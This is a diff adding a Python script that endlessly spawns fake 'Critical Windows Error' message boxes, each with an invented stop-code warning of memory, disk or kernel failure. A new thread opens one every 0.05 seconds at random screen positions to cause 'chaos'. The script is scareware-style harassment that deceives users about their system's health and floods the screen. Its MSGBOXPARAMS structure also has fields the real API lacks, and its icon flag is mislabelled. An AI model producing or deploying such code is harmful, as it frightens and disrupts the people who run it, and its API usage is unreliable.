@@ -1,0 +1,66 @@
+import ctypes
+import random
+import threading
+import asyncio
+from ctypes import wintypes
+
+user32 = ctypes.windll.user32
+screen_width = user32.GetSystemMetrics(0)
+screen_height = user32.GetSystemMetrics(1)
+
+errors = [
+    ("0x0000011A", "Critical memory management failure detected (0x0000011A). Save your work immediately and restart your computer."),
+    ("0x00000024", "A critical NTFS file system error has been detected (0x00000024). Data loss may occur if you continue to use this system."),
+    ("0x00000139", "Error 0x139 KERNEL_SECURITY_CHECK_FAILURE\nThe KERNEL_SECURITY_CHECK_FAILURE bug check has a value of 0x00000139. This bug check indicates that the kernel has detected the corruption of a critical data structure."),
+    ("0x00000124", "A hardware error has occurred (0x00000124 - WHEA_UNCORRECTABLE_ERROR). Windows cannot continue safely."),
+    ("0x00000109", "A critical system structure has been corrupted (0x00000109). Your system may be unstable. Restart now."),
+]
+
+def show_error():
+    # Random position for each box
+    x = random.randint(0, screen_width - 300)
+    y = random.randint(0, screen_height - 150)
+
+    code, name = random.choice(errors)
+
+    class MSGBOXPARAMS(ctypes.Structure):
+        _fields_ = [
+            ("cbSize", wintypes.UINT),
+            ("hwndOwner", wintypes.HWND),
+            ("hInstance", wintypes.HINSTANCE),
+            ("lpszText", wintypes.LPCWSTR),
+            ("lpszCaption", wintypes.LPCWSTR),
+            ("dwStyle", wintypes.DWORD),
+            ("lpszIcon", wintypes.LPCWSTR),
+            ("dwContextHelpId", wintypes.DWORD),
+            ("lpfnMsgBoxCallback", wintypes.LPVOID),
+            ("dwLanguageId", wintypes.DWORD),
+            ("x", wintypes.INT),
+            ("y", wintypes.INT),
+            ("cx", wintypes.INT),
+            ("cy", wintypes.INT),
+        ]
+
+    params = MSGBOXPARAMS()
+    params.cbSize = ctypes.sizeof(MSGBOXPARAMS)
+    params.hwndOwner = 0
+    params.hInstance = 0
+    params.lpszText = name
+    params.lpszCaption = "Critical Windows Error"
+    params.dwStyle = 0x00000030  # MB_ICONERROR | MB_OK
+    params.dwContextHelpId = 0
+    params.lpfnMsgBoxCallback = 0
+    params.dwLanguageId = 0
+    params.x = x
+    params.y = y
+    params.cx = 300
+    params.cy = 150
+
+    ctypes.windll.user32.MessageBoxIndirectW(ctypes.byref(params))
+
+async def error_wall():
+    while True:
+        threading.Thread(target=show_error).start()
+        await asyncio.sleep(0.05)  # faster = more chaos
+
+asyncio.run(error_wall())
